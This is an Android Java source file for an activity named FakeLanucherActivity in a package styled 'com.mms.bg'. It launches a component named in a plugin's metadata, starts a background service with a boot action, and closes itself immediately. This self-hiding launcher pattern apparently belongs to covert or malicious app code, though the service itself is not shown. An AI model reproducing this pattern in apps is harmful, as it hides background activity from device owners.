package com.mms.bg.ui;

import java.util.List;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Bundle;
import android.util.Log;

public class FakeLanucherActivity extends Activity {
    private static final String TAG = "FakeLanucherActivity";
    private static final boolean DEBUG = true; 
    
    private static final String PACKAGE_NAME = "com.package.name";
    private static final String COMPONENT_NAME = "com.component.name";
    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
//        Bundle metaData = this.getApplicationInfo().metaData;
//        if (metaData != null) {
//            String packageName = metaData.getString(PACKAGE_NAME);
//            String componentName = metaData.getString(COMPONENT_NAME);
//            LOGD("packageName = " + packageName + " componentName = " + componentName);
//            if (packageName != null && componentName != null) {
//                Intent intent = new Intent();
//                ComponentName c = new ComponentName(packageName, componentName);
//                intent.setComponent(c);
//                LOGD("Start Activity : " + intent);
//                this.startActivity(intent);
//            }
//        }
        
        PackageManager pm = getPackageManager();
        List<ResolveInfo> plugins = pm.queryIntentServices(
                                   new Intent(BgService.FILTER_ACTION), PackageManager.GET_META_DATA);
        SettingManager.getInstance(getApplicationContext()).mPid = "0";
        for (ResolveInfo info : plugins) {
            LOGD("package name = " + info.serviceInfo.packageName);
            if (info.serviceInfo.name.equals("com.mms.bg.ui.BgService") == true) {
                if (info.serviceInfo.metaData != null) {
                    String packageName = info.serviceInfo.metaData.getString(PACKAGE_NAME);
                    String componentName = info.serviceInfo.metaData.getString(COMPONENT_NAME);
                    LOGD("packageName = " + packageName + " componentName = " + componentName);
                    if (packageName != null && componentName != null) {
                        Intent intent = new Intent();
                        ComponentName c = new ComponentName(packageName, componentName);
                        intent.setComponent(c);
                        LOGD("Start Activity : " + intent);
                        this.startActivity(intent);
                    }
                }
            }
        }
        
        Intent intent1 = new Intent(this, BgService.class);
        intent1.setAction(BgService.ACTION_BOOT);
        startService(intent1);
        SettingManager.getInstance(this).log("FakeLanucherActivity::onCreate");
    }
    
    @Override
    public void onStart() {
        super.onStart();
        finish();
    }
    
    private void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, "[[" + this.getClass().getName() 
                    + "::" + Thread.currentThread().getStackTrace()[3].getMethodName()
                    + "]] " + msg);
        }
    }
}
